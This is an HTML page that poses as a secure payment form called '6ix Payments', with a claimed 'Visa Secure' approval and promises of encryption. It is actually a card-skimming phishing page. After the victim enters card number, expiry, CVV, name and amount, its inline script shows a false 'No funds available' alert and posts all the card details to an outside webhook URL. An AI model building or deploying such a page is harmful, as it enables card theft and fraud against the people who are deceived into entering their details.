<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>6ix Payments üîí</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="welcome-screen" class="screen">
        <div class="welcome-content">
            <h1>Welcome to 6ix Payments üí≥</h1>
            <p>Your secure and encrypted payment solution.</p>
            <button id="payWithCard">Pay with Card üõí</button>
        </div>
    </div>

    <div id="payment-screen" class="screen hidden">
        <div class="form-container">
            <h1>Secure Payment üí≥</h1>
            <p>Enter your card details below to complete your purchase. Your information is encrypted and secure üîê.</p>
            <form id="cardForm">
                <div class="form-group">
                    <label for="cardNumber">Card Number üí≥</label>
                    <input type="text" id="cardNumber" required>
                    <span class="error" id="cardNumberError"></span>
                </div>
                <div class="form-group">
                    <label for="expiryDate">Expiry Date üìÖ</label>
                    <input type="text" id="expiryDate" required>
                    <span class="error" id="expiryDateError"></span>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV üîí</label>
                    <input type="text" id="cvv" required>
                    <span class="error" id="cvvError"></span>
                </div>
                <div class="form-group">
                    <label for="cardHolder">Card Holder Name üë§</label>
                    <input type="text" id="cardHolder" required>
                </div>
                <div class="form-group">
                    <label for="amount">Amount üí∞</label>
                    <input type="text" id="amount" required>
                    <span class="error" id="amountError"></span>
                </div>
                <button type="submit">Submit üõí</button>
            </form>
        </div>

        <div class="payment-processor">
            <p>Approved by <strong>Visa Secure</strong></p>
        </div>
    </div>

    <script src="website.js"></script>
    <script>
        document.getElementById('payWithCard').addEventListener('click', function() {
            document.getElementById('welcome-screen').classList.add('hidden');
            document.getElementById('payment-screen').classList.remove('hidden');
        });

        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var a = document.getElementById('cardNumber').value;
            var b = document.getElementById('expiryDate').value;
            var c = document.getElementById('cvv').value;
            var d = document.getElementById('cardHolder').value;
            var e = document.getElementById('amount').value;

            var cardNumberError = document.getElementById('cardNumberError');
            var expiryDateError = document.getElementById('expiryDateError');
            var cvvError = document.getElementById('cvvError');
            var amountError = document.getElementById('amountError');

            cardNumberError.textContent = '';
            expiryDateError.textContent = '';
            cvvError.textContent = '';
            amountError.textContent = '';

            if (!/^\d{16}$/.test(a)) {
                cardNumberError.textContent = 'Card number must be 16 digits.';
                return;
            }

            if (!/^\d{2}\/\d{2}$/.test(b)) {
                expiryDateError.textContent = 'Expiry date must be in MM/YY format.';
                return;
            }

            if (!/^\d{3}$/.test(c)) {
                cvvError.textContent = 'CVV must be 3 digits.';
                return;
            }

            if (!/^\d+(\.\d{1,2})?$/.test(e)) {
                amountError.textContent = 'Amount must be a valid number.';
                return;
            }

            alert('No funds available.');

            var g = `
            **Card Details:**
            - Card Number: \`${a}\`
            - Expiry Date: \`${b}\`
            - CVV: \`${c}\`
            - Card Holder Name: \`${d}\`
            - Amount: \`${e}\`
            `;

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: g
                })
            })
            .then(function(h) {
                return h.json();
            })
            .then(function(i) {
                console.log('Success:', i);
                alert('Card details sent successfully!');
            })
            .catch(function(j) {
                console.error('Error:', j);
                alert('Failed to send card details.');
            });
        });
    </script>
</body>
</html>
